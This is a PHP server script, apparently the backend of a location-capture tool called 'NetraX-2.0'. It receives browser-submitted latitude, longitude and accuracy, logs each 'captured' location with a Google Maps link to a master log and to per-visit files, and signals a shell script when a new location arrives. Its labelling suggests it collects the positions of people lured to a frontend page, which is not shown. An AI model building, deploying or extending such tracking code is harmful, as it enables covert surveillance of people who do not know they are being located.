<?php
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

$date = date('Y-m-d H:i:s');

/* ── Central data directory ── */
$data_dir = dirname(__DIR__) . '/data';
if (!is_dir($data_dir) && !mkdir($data_dir, 0750, true)) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Storage unavailable']);
    exit;
}

/* ── Handle geolocation error reports from frontend ── */
if (!empty($_POST['error'])) {
    $error_code = preg_replace('/[^0-9]/', '', (string) ($_POST['error_code'] ?? ''));
    $error_msg  = trim((string) ($_POST['error_msg'] ?? 'Unknown geolocation error'));
    $error_msg  = preg_replace('/[\x00-\x1F\x7F]/', '', $error_msg) ?? 'Unknown geolocation error';
    $error_msg  = substr($error_msg, 0, 200);

    $error_data = 'Code: ' . ($error_code !== '' ? $error_code : 'unknown') . ' - ' . $error_msg;
    file_put_contents('php://stderr', "[NetraX-2.0] Geolocation ERROR: {$error_data}\n");
    file_put_contents($data_dir . '/.flag_location_error', $error_data);

    echo json_encode(['status' => 'error', 'message' => $error_data]);
    exit;
}

if (!isset($_POST['lat'], $_POST['lon'])) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
    exit;
}

$latitudeRaw  = trim((string) $_POST['lat']);
$longitudeRaw = trim((string) $_POST['lon']);
$accuracyRaw  = trim((string) ($_POST['acc'] ?? ''));

$latitude  = filter_var($latitudeRaw, FILTER_VALIDATE_FLOAT);
$longitude = filter_var($longitudeRaw, FILTER_VALIDATE_FLOAT);

if ($latitude === false || $longitude === false || $latitude < -90 || $latitude > 90 || $longitude < -180 || $longitude > 180) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid coordinates']);
    exit;
}

$accuracy = filter_var($accuracyRaw, FILTER_VALIDATE_FLOAT);
if ($accuracy === false || $accuracy < 0) {
    $accuracy = null;
}

$date_file = date('Ymd_His') . '_' . substr(bin2hex(random_bytes(3)), 0, 6);
$latText   = number_format((float) $latitude, 6, '.', '');
$lonText   = number_format((float) $longitude, 6, '.', '');
$accText   = $accuracy === null ? 'Unknown' : number_format((float) $accuracy, 2, '.', '');

file_put_contents('php://stderr', "[NetraX-2.0] Location captured: lat={$latText}, lon={$lonText}, acc={$accText}\n");

$data = "=== New Location Captured ===\n"
      . "Latitude:  {$latText}\n"
      . "Longitude: {$lonText}\n"
      . "Accuracy:  {$accText} meters\n"
      . "Google Maps: https://www.google.com/maps/place/{$latText},{$lonText}\n"
      . "Date:      {$date}\n\n";

/* ── Append to master location log with file locking ── */
$master_log = $data_dir . '/all_locations.log';
$fp = fopen($master_log, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $data);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ── Save individual timestamped file inside /data/ ── */
$basename = 'location_' . $date_file . '.txt';
$individual_file = $data_dir . '/' . $basename;
$fp2 = fopen($individual_file, 'x');
if (!$fp2) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save location']);
    exit;
}

flock($fp2, LOCK_EX);
$written = fwrite($fp2, $data);
flock($fp2, LOCK_UN);
fclose($fp2);

if ($written === false || $written < strlen($data)) {
    @unlink($individual_file);
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save location']);
    exit;
}

/* ── Signal shell script that new location arrived ── */
file_put_contents($data_dir . '/.flag_location', $basename);
file_put_contents('php://stderr', "[NetraX-2.0] Location saved: {$individual_file}\n");

echo json_encode(['status' => 'success', 'message' => 'Location data received']);
exit;
